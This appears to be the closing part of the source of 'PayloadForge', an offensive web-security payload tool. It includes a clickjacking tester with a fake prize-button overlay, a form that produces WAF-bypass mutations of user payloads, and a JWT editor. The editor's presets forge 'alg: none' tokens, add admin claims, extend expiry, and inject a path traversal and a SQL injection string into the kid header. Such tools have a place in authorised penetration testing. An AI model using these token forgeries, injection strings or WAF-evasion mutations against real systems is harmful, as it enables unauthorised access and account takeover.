        <strong style="color:#ff4444;">Vulnerable</strong> = iframe loads normally (no X-Frame-Options / CSP frame-ancestors).<br>
        <strong style="color:#00ff41;">Protected</strong> = browser blocks the load.
      </p>
    </div>
    <div class="cj-row">
      <input type="text" class="cj-inp" id="cjDomain" placeholder="https://example.com" value="https://example.com">
      <button type="button" class="cj-btn" onclick="testCJ()">&#x25BA; TEST</button>
      <button type="button" class="cj-btn" onclick="toggleOv()" style="background:var(--orange);">&#x1F441; OVERLAY</button>
    </div>
    <div class="cj-box" id="cjResult" style="display:none;">
      <div class="cj-bar" id="cjBar">
        <span id="cjDot">&#x25CF;</span>&nbsp;<span id="cjTxt">TESTING...</span>
        <span id="cjHdr" style="margin-left:auto;font-size:10px;"></span>
      </div>
      <div class="cj-ifwrap">
        <iframe id="cjFrame" class="cj-iframe" referrerpolicy="no-referrer"></iframe>
        <div class="cj-overlay" id="cjOv">
          <div class="cj-fake" onclick="alert('USER CLICKED THE FAKE BUTTON!

In a real attack this could trigger:
- Account deletion
- Password change
- Payment authorization
- OAuth approval')">&#x1F381; CLAIM YOUR FREE PRIZE!</div>
        </div>
      </div>
    </div>
    <div class="cj-igrid">
      <div class="cj-card"><h4 style="color:#ff4488;">&#x26A0; VULNERABLE</h4><p>Page loads in the iframe. An attacker positions a transparent iframe over a fake UI to hijack clicks on the real site.</p></div>
      <div class="cj-card"><h4 style="color:#00ff41;">&#x2713; PROTECTED</h4><p>Browser refuses to load. Protected by <code style="color:#ffd700;">X-Frame-Options: DENY/SAMEORIGIN</code> or <code style="color:#ffd700;">CSP: frame-ancestors 'none'</code>.</p></div>
      <div class="cj-card"><h4 style="color:#ffd700;">MITIGATION</h4><p>Add to HTTP response:<br><code style="color:#ffd700;">X-Frame-Options: DENY</code><br><code style="color:#ffd700;">Content-Security-Policy: frame-ancestors 'none'</code></p></div>
      <div class="cj-card"><h4 style="color:#44aaff;">PoC PAYLOADS</h4><p>The LIBRARY tab has iframe embed snippets, transparent overlay templates, and detection commands ready to copy for reports.</p></div>
    </div>
    <div>
      <label class="slabel">SELECTED PAYLOAD</label>
      <textarea rows="3" placeholder="Select a payload from the sidebar to view it here..."><?=h($customPayload)?></textarea>
      <button type="button" class="copy-btn" data-value="<?=h($customPayload)?>" onclick="copyFromAttr(this)">COPY PAYLOAD</button>
    </div>
  </div>

  <?php else: ?>
  <form method="post" action="?cat=<?=h($activeCategory)?>&tab=mutations<?=$selectedId?'&pid='.h($selectedId):''?>">
    <?php if($selectedPayload): ?>
    <div style="margin-bottom:12px;font-size:11px;color:var(--dim);letter-spacing:1px;">
      LOADED: <span style="color:<?=$activeColor?>"><?=h($selectedPayload['name'])?></span>
      <span class="sbadge <?=$selectedPayload['source']==='PATT'?'spatt':'spf'?>" style="margin-left:8px;"><?=h($selectedPayload['source'])?></span>
    </div>
    <?php endif; ?>
    <label class="slabel">PAYLOAD EDITOR</label>
    <textarea name="custom_payload" rows="5" placeholder="Paste or type your payload..."><?=h($customPayload)?></textarea>
    <label class="slabel">WAF BYPASS PROFILE</label>
    <div class="chip-group">
      <?php foreach($WAF_PROFILES as $wn=>$muts): ?>
      <button type="button" class="chip<?=$activeWaf===$wn?' aw':''?>"
              onclick="selectWaf(this,'<?=h($wn)?>',<?=htmlspecialchars(json_encode($muts),ENT_QUOTES)?>)"><?=h($wn)?></button>
      <?php endforeach; ?>
      <button type="button" class="chip cc" onclick="clearWaf()">CLEAR</button>
    </div>
    <input type="hidden" name="waf_profile" id="waf_input" value="">
    <div class="waf-note" id="waf_note"></div>
    <label class="slabel">MUTATIONS <span style="color:var(--border3)">&#x2014; TOGGLE TO CUSTOMIZE (none = all)</span></label>
    <div class="chip-group" id="mut_chips">
      <?php foreach($MUTATION_LABELS as $key=>$label): ?>
      <button type="button" class="chip" data-mut="<?=h($key)?>" onclick="toggleMut(this,'<?=h($key)?>')"><?=h($label)?></button>
      <?php endforeach; ?>
    </div>
    <div id="mut_hidden"></div>
    <input type="hidden" name="export_format" id="export_format_input" value="">
    <button type="submit" class="gen-btn">&#x26A1; GENERATE MUTATIONS</button>
  </form>
  <?php endif; ?>

  <?php elseif($activeTab==='mutations'): ?>
  <?php if(empty($mutationResults)): ?>
    <div class="empty"><div class="ei">&#x26A1;</div><p>NO MUTATIONS YET</p><small>Go to CUSTOM &rarr; Generate Mutations</small></div>
  <?php else: ?>
    <?php
    $replayInputs = '';
    foreach($selectedMutations as $sm) {
        if (isset($MUTATION_LABELS[$sm])) {
            $replayInputs .= '<input type="hidden" name="mutations[]" value="'.h($sm).'">';
        }
    }
    ?>
    <form id="export-replay-form" method="post" action="?cat=<?=h($activeCategory)?>&tab=mutations<?=$selectedId?'&pid='.h($selectedId):''?>">
      <input type="hidden" name="custom_payload" value="<?=h($customPayload)?>">
      <input type="hidden" name="waf_profile" value="<?=h($activeWaf)?>">
      <input type="hidden" name="export_format" id="export_fmt_replay" value="">
      <?=$replayInputs?>
    </form>
    <div class="mut-header">
      <div class="mut-count"><?=count($mutationResults)?> MUTATIONS</div>
      <div class="export-btns">
        <button type="button" class="exp-btn" onclick="submitExportReplay('txt')">&#x2B07; .TXT</button>
        <button type="button" class="exp-btn" onclick="submitExportReplay('json')">&#x2B07; .JSON</button>
      </div>
    </div>
    <div class="base-label">BASE: <span><?=h($customPayload)?></span></div>
    <div class="mut-list">
      <?php foreach($mutationResults as $r): ?>
      <div class="mut-row">
        <div class="mut-lbl"><?=h($r['label'])?></div>
        <div class="mut-val" title="<?=h($r['result'])?>" data-value="<?=h($r['result'])?>" onclick="copyFromAttr(this)"><?=h($r['result'])?></div>
        <button type="button" class="copy-btn" data-value="<?=h($r['result'])?>" onclick="copyFromAttr(this)">COPY</button>
      </div>
      <?php endforeach; ?>
    </div>
  <?php endif; ?>
  <?php endif; ?>

  <div class="credit" style="margin-top:28px;">
    Payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a>
    by @swisskyrepo (MIT License) &nbsp;&middot;&nbsp; Combined with original PayloadForge payloads
    <br><br>
    <span style="color:var(--border3)">Built &#x26A1; by</span>
    <a href="https://github.com/Juguitos/payloadforge" target="_blank" rel="noopener"
       style="color:var(--green);font-weight:bold;letter-spacing:2px;text-shadow:0 0 8px #00ff4155;">@Juguitos</a>
    <span style="color:var(--border3)">&nbsp;&middot;&nbsp;</span>
    <a href="https://github.com/Juguitos/payloadforge" target="_blank" rel="noopener" style="color:#00ff4155;">github.com/Juguitos/payloadforge</a>
  </div>
</main>
</div>
</div>

<script>
(function(){
  const c=document.getElementById('matrix');const ctx=c.getContext('2d');
  function resize(){c.width=window.innerWidth;c.height=window.innerHeight;}
  resize();window.addEventListener('resize',resize);
  const chars='01XSSSQLI<>{}[]=';
  let d=[];
  setInterval(()=>{
    if(d.length!==Math.floor(c.width/14))d=Array(Math.floor(c.width/14)).fill(1);
    ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);
    ctx.font='12px monospace';
    d.forEach((y,i)=>{
      ctx.fillStyle=i%7===0?'#f03':'#0f3';
      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*14,y*14);
      if(y*14>c.height&&Math.random()>.975)d[i]=0;d[i]++;
    });
  },40);
})();

function copyFromAttr(el){
  var text=el.dataset.value;
  var doFlash=function(btn){
    var o=btn.textContent;
    btn.textContent='COPIED!';btn.style.borderColor='var(--green)';btn.style.color='var(--green)';
    setTimeout(function(){btn.textContent=o;btn.style.borderColor='';btn.style.color='';},1500);
  };
  var btn=el.classList.contains('copy-btn')?el:(el.closest('.mut-row')?el.closest('.mut-row').querySelector('.copy-btn'):el);
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(text).then(function(){doFlash(btn);}).catch(function(){fallbackCopy(text,btn);});
  }else{fallbackCopy(text,btn);}
}
function fallbackCopy(text,btn){
  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;opacity:0';
  document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
  if(btn){var o=btn.textContent;btn.textContent='COPIED!';btn.style.borderColor='var(--green)';btn.style.color='var(--green)';setTimeout(function(){btn.textContent=o;btn.style.borderColor='';btn.style.color='';},1500);}
}

function submitExportReplay(fmt){
  var inp=document.getElementById('export_fmt_replay');
  if(inp){inp.value=fmt;document.getElementById('export-replay-form').submit();}
}
var am=new Set();
function selectWaf(btn,name,muts){
  document.querySelectorAll('.chip:not([data-mut])').forEach(function(c){c.classList.remove('aw');});
  btn.classList.add('aw');document.getElementById('waf_input').value=name;
  am.clear();muts.forEach(function(m){am.add(m);});refreshChips();
  document.getElementById('waf_note').textContent='-> '+muts.join(', ');
}
function clearWaf(){
  document.querySelectorAll('.chip').forEach(function(c){c.classList.remove('aw','am');});
  document.getElementById('waf_input').value='';am.clear();refreshHidden();
  document.getElementById('waf_note').textContent='';
}
function toggleMut(btn,key){
  if(am.has(key)){am.delete(key);btn.classList.remove('am');}else{am.add(key);btn.classList.add('am');}
  refreshHidden();
}
function refreshChips(){
  document.querySelectorAll('#mut_chips .chip[data-mut]').forEach(function(c){c.classList.toggle('am',am.has(c.dataset.mut));});
  refreshHidden();
}
function refreshHidden(){
  var co=document.getElementById('mut_hidden');if(!co)return;co.innerHTML='';
  am.forEach(function(m){var i=document.createElement('input');i.type='hidden';i.name='mutations[]';i.value=m;co.appendChild(i);});
}

/* JWT EDITOR */
function b64ud(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';try{return atob(s);}catch(e){return null;}}
function b64ue(s){return btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');}
function decodeJwt(){
  var raw=(document.getElementById('jwtInput').value||'').trim();
  var parts=raw.split('.');
  if(parts.length!==3){alert('Invalid JWT: expected 3 parts');return;}
  try{
    var h=JSON.parse(b64ud(parts[0]));
    var p=JSON.parse(b64ud(parts[1]));
    document.getElementById('jwtHeader').value=JSON.stringify(h,null,2);
    document.getElementById('jwtPayload').value=JSON.stringify(p,null,2);
    var alg=(h.alg||'').toUpperCase();
    var badge=document.getElementById('jwtAlgBadge');
    var cls='jhs',w='';
    if(alg==='NONE'||alg===''){cls='jnone';w=' WARNING: UNSIGNED';}
    else if(alg.charAt(0)==='R'||alg.charAt(0)==='E'){cls='jrs';}
    badge.innerHTML='<span class="jbadge '+cls+'">alg: '+(alg||'none')+w+'</span><span style="font-size:10px;color:var(--dim);margin-left:8px;">sig: '+parts[2].substring(0,16)+'...</span>';
  }catch(e){alert('Decode failed: '+e.message);}
}
function jwtAttack(type){
  var h,p;
  try{h=JSON.parse(document.getElementById('jwtHeader').value||'{}');}catch(e){h={};}
  try{p=JSON.parse(document.getElementById('jwtPayload').value||'{}');}catch(e){p={};}
  if(type==='algnone'){h.alg='none';}
  else if(type==='admin'){p.role='admin';p.isAdmin=true;p.admin=true;}
  else if(type==='exp'){p.exp=9999999999;p.iat=Math.floor(Date.now()/1000);}
  else if(type==='isadmin'){p.isAdmin=true;p.is_admin=true;p.admin=1;}
  else if(type==='kidnull'){h.kid='../../dev/null';h.alg='HS256';}
  else if(type==='kidsqli'){h.kid="x' UNION SELECT 'secret'-- -";h.alg='HS256';}
  document.getElementById('jwtHeader').value=JSON.stringify(h,null,2);
  document.getElementById('jwtPayload').value=JSON.stringify(p,null,2);
}
function forgeJwt(algNone){
  var h,p;
  try{h=JSON.parse(document.getElementById('jwtHeader').value);}catch(e){alert('Invalid header JSON');return;}
  try{p=JSON.parse(document.getElementById('jwtPayload').value);}catch(e){alert('Invalid payload JSON');return;}
  if(algNone)h.alg='none';
  var hEnc=b64ue(JSON.stringify(h));
  var pEnc=b64ue(JSON.stringify(p));
  var sig=algNone?'':'REPLACE_WITH_REAL_SIGNATURE';
  var token=hEnc+'.'+pEnc+'.'+sig;
  var el=document.getElementById('jwtForged');
  el.textContent=token;el.style.display='block';el.dataset.value=token;
}
function copyForged(){
  var el=document.getElementById('jwtForged');
  if(!el||el.style.display==='none'){alert('Generate a token first');return;}
  fallbackCopy(el.textContent,null);
  el.style.borderColor='#ffd700';
  setTimeout(function(){el.style.borderColor='var(--green)';},1000);
}

/* CLICKJACKING DEMO */
var ovOn=false;
function testCJ(){
  var url=(document.getElementById('cjDomain').value||'').trim();
  if(!url)return;
  if(url.indexOf('http')!==0)url='https://'+url;
  var res=document.getElementById('cjResult');
  var frame=document.getElementById('cjFrame');
  var bar=document.getElementById('cjBar');
  var txt=document.getElementById('cjTxt');
  var dot=document.getElementById('cjDot');
  var hdr=document.getElementById('cjHdr');
  res.style.display='block';
  bar.className='cj-bar';dot.style.color='#ffd700';
  txt.textContent='LOADING...';hdr.textContent='';
  frame.src='';
  frame.onload=function(){
    try{
      var doc=frame.contentDocument||frame.contentWindow.document;
      if(doc){
        dot.style.color='#ff4444';bar.className='cj-bar cj-vuln';
        txt.textContent='VULNERABLE — Page loaded in iframe (missing X-Frame-Options)';
        hdr.textContent='X-Frame-Options: NOT SET';
      }
    }catch(e){
      dot.style.color='#ff4444';bar.className='cj-bar cj-vuln';
      txt.textContent='VULNERABLE — Page loaded (cross-origin detected)';
      hdr.textContent='Check DevTools for response headers';
    }
  };
  frame.onerror=function(){
    dot.style.color='#888';txt.textContent='Could not load — network error or HTTPS required';
  };
  setTimeout(function(){
    if(dot.style.color==='rgb(255, 215, 0)'){
      dot.style.color='#00ff41';bar.className='cj-bar cj-safe';
      txt.textContent='PROTECTED — Browser blocked iframe (X-Frame-Options or CSP frame-ancestors)';
      hdr.textContent='Check DevTools Network tab for headers';
    }
  },3000);
  frame.src=url;
}
function toggleOv(){
  ovOn=!ovOn;
  document.getElementById('cjOv').style.display=ovOn?'block':'none';
}
</script>
</body>
</html>
